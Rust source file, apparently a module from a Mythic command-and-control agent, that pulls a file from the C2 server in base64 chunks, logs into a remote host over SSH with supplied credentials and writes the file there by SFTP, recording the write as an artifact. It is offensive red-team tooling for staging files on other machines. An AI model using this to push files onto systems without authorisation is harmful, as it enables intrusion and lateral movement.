use super::ssh_authenticate;
use crate::{AgentTask, ContinuedData};
use crate::{mythic_continued, mythic_success};
use base64::{Engine as _, engine::general_purpose};
use serde_json::json;
use std::error::Error;
use std::result::Result;
use std::sync::mpsc;

const CHUNK_SIZE: usize = 512000;

pub fn upload_file(
    task_id: &str,
    args: &super::SshArgs,
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let file_id = args.upload.as_ref().unwrap();
    let upload_path = args.upload_path.as_ref().unwrap();

    tx.send(json!({
        "upload": json!({
            "chunk_size": CHUNK_SIZE,
            "file_id": file_id,
            "chunk_num": 1,
        }),
        "task_id": task_id,
    }))?;

    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;

    let mut file_data: Vec<u8> = general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?;

    for chunk_num in 2..=continued_args.total_chunks.unwrap() {
        tx.send(json!({
            "upload": json!({
                "chunk_size": CHUNK_SIZE,
                "file_id": file_id,
                "chunk_num": chunk_num,
            }),
            "task_id": task.id,
        }))?;

        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
        let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
        file_data.append(&mut general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?);
    }

    tx.send(mythic_continued!(
        task.id,
        "received",
        "Agent received file"
    ))?;

    let sess = ssh_authenticate(args)?;
    let mode = args.mode.unwrap_or(0o644);
    sess.sftp_write(upload_path, &file_data, mode)?;

    let mut output = mythic_success!(
        task.id,
        format!(
            "Uploaded file to {}@{}:{}",
            args.credentials.account, args.host, upload_path
        )
    );
    let output = output.as_object_mut().unwrap();
    output.insert(
        "artifacts".to_string(),
        serde_json::json!([
            {
                "base_artifact": "Remote FileWrite",
                "artifact": format!("ssh {}@{} -upload {}", args.credentials.account, args.host, upload_path)
            }
        ]),
    );

    tx.send(serde_json::to_value(output)?)?;
    Ok(())
}
